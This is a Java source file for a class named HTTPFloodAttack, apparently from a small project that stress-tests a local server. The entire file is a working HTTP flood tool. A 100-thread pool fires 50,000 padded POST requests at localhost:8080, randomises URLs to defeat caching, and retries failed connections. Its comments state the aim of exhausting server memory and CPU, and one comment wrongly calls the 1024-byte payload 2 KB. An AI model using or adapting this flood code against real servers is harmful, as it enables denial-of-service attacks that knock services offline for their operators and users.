package io.codeforall.fanstatics;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class HTTPFloodAttack {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 8080;
    private static final int REQUESTS = 50000; // Total requests to send
    private static final int PAYLOAD_SIZE = 1024; // 2 KB payload to increase server load
    private static final int THREAD_POOL_SIZE = 100; // Adjusted thread pool size to avoid resource exhaustion

    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(THREAD_POOL_SIZE);
        Random random = new Random();

        // Create a large payload to maximize memory and CPU usage on the server
        StringBuilder payloadBuilder = new StringBuilder();
        for (int i = 0; i < PAYLOAD_SIZE; i++) {
            payloadBuilder.append("A"); // Filling the payload with 'A' characters
        }
        String payload = payloadBuilder.toString();

        for (int i = 0; i < REQUESTS; i++) {
            executorService.submit(() -> {
                String randomPath = "/test?" + "param=" + random.nextInt(1000000); // Randomize URL to avoid caching
                for (int attempt = 0; attempt < 3; attempt++) { // Retry up to 3 times if connection fails
                    try (Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
                         OutputStream out = socket.getOutputStream()) {

                        // Construct and send a large HTTP POST request
                        String request = "POST " + randomPath + " HTTP/1.1\r\n" +
                                "Host: " + SERVER_ADDRESS + "\r\n" +
                                "Content-Length: " + payload.length() + "\r\n" +
                                "\r\n" + payload;

                        out.write(request.getBytes());
                        out.flush();
                        System.out.println("Sent complex HTTP request to server.");
                        break; // Exit retry loop on success

                    } catch (IOException e) {
                        System.err.println("Request failed (attempt " + attempt + "): " + e.getMessage());
                        try {
                            Thread.sleep(50); // Small pause before retrying
                        } catch (InterruptedException ie) {
                            Thread.currentThread().interrupt();
                        }
                    }
                }
            });
        }

        executorService.shutdown();
    }
}





